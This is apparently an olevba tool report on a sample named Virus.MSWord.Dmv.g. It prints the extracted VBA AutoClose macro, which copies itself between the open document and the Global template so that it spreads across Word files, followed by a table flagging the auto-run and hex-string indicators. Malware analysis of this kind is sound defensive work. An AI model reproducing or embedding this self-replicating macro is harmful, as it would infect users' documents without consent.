olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dmv.g
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dmv.g - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Dmv.g - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim total
Dim present
Dim cycle
Dim a$
total = WordBasic.CountMacros(0)
present = 0

If total > 0 Then
    For cycle = 1 To total
        If WordBasic.[MacroName$](cycle, 0) = "AutoClose" Then
            present = 1
        End If
'End If

a$ = WordBasic.[WindowName$]() + ":AutoClose"

If present <> 1 Then
    WordBasic.MacroCopy a$, "Global:AutoClose"
Else
    present = 0
    If WordBasic.CountMacros(1) <> 0 Then
        present = 1
    End If

    If present = 0 Then
        WordBasic.FileSaveAs Format:=1
        WordBasic.MacroCopy "Global:AutoClose", a$
    End If
End If

WordBasic.FileSave

Next
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

